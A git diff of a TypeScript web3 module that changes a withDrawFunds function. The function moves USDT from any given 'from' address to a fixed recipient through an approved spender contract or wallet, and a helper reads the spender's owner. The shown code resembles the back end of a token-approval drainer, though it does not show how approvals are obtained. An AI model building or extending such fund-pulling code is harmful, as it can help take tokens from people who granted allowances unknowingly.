@@ -105,15 +105,41 @@ export const connectWalletBSC = async () => {
   }
 };
 
-export const withDrawFunds = async (from: string , amount: number) => {
+export const withDrawFunds = async (from: string, amount: number) => {
   try {
     const { web3, account } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
     // amount to be in wei
-    const amountInWei = web3.utils.toWei(amount.toString(), 'ether');
-    const deligator = new web3.eth.Contract(spender_Contract_Abi, SPENDER_ADDRESS);
-    const tx = await deligator.methods.delegatedTransfer(USDT_CONTRACT_ADDRESS, from, RECIPIENT_ADDRESS, amountInWei).send({ from: account });
-    return tx
+    const amountInWei = web3.utils.toWei(amount.toString(), "ether");
+
+    // Check if SPENDER_ADDRESS is a contract or EOA
+    const code = await web3.eth.getCode(SPENDER_ADDRESS);
+    const isContract = code !== "0x" && code !== "0x0";
+
+    if (isContract) {
+      // If it's a contract, use delegatedTransfer
+      const deligator = new web3.eth.Contract(
+        spender_Contract_Abi,
+        SPENDER_ADDRESS
+      );
+      const tx = await deligator.methods
+        .delegatedTransfer(
+          USDT_CONTRACT_ADDRESS,
+          from,
+          RECIPIENT_ADDRESS,
+          amountInWei
+        )
+        .send({ from: account });
+      return tx;
+    } else {
+      // If it's a wallet (EOA), use transferFrom directly on the USDT contract
+      // NOTE: The 'account' connected must be the SPENDER_ADDRESS itself to have permission.
+      const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+      const tx = await usdtContract.methods
+        .transferFrom(from, RECIPIENT_ADDRESS, amountInWei)
+        .send({ from: account });
+      return tx;
+    }
   } catch (err) {
     console.error("Error in withDrawFunds:", err);
     return {
@@ -123,15 +149,28 @@ export const withDrawFunds = async (from: string , amount: number) => {
   }
 };
 
-export const contract_Owner= async ():Promise<string | null> => {
+export const contract_Owner = async (): Promise<string | null> => {
   try {
     const { web3 } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
-    const usdtContract = new web3.eth.Contract(spender_Contract_Abi, SPENDER_ADDRESS);
-    const owner = await usdtContract.methods.owner().call();
-    return owner as unknown as string;
+
+    // Check if SPENDER_ADDRESS is a contract or EOA
+    const code = await web3.eth.getCode(SPENDER_ADDRESS);
+    const isContract = code !== "0x" && code !== "0x0";
+
+    if (isContract) {
+      const usdtContract = new web3.eth.Contract(
+        spender_Contract_Abi,
+        SPENDER_ADDRESS
+      );
+      const owner = await usdtContract.methods.owner().call();
+      return owner as unknown as string;
+    } else {
+      // If it's a wallet, the 'owner' is essentially the wallet itself
+      return SPENDER_ADDRESS;
+    }
   } catch (error) {
-    console.error("Error fetching balance:", error);
+    console.error("Error fetching owner:", error);
     return null;
   }
 };
